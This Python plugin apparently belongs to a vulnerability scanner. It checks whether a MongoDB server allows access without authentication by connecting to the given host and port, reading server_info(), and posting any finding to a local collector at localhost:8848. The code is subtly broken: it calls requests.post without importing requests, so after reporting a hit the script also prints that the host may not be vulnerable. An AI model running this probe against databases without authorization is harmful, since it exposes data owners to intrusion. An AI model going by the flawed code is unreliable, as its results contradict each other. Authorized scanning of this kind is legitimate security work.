#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: mongodb 未授权漏洞
referer: unknown
author: Lucifer
description: 开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作而且可以远程访问数据库！
'''
import sys
import pymongo
import warnings
from termcolor import cprint
from urllib.parse import urlparse

class mongodb_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 27017
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            mongo = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=6000)
            version = mongo.server_info()['version']
            ok = mongo.server_info()['ok']
            if version is not None and ok is not None:
                cprint("[+]存在mongodb 未授权漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
                postdata = {self.url:"存在mongodb 未授权漏洞...(高危)\tpayload: "+host+":"+str(port)}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在mongodb_unauth漏洞", "white", "on_grey")
            mongo.close()

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mongodb_unauth_BaseVerify(sys.argv[1])
    testVuln.run()
